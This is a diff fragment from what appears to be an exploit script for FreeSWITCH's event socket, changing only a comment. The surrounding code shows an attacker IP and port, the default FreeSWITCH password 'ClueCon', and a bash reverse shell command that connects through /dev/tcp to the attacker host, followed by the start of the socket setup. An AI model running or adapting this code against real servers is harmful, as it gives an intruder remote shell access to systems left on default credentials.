@@ -13,7 +13,7 @@ REVERSE_IP = '192.168.45.193'  # Attacker IP
 REVERSE_PORT = '4444'  # Attacker Port
 PASSWORD = 'ClueCon'  # Default password for FreeSWITCH
 
-# Define bash reverse shell command
+# Define simpler reverse shell command
 CMD = f'/bin/bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1'
 
 s = socket(AF_INET, SOCK_STREAM)
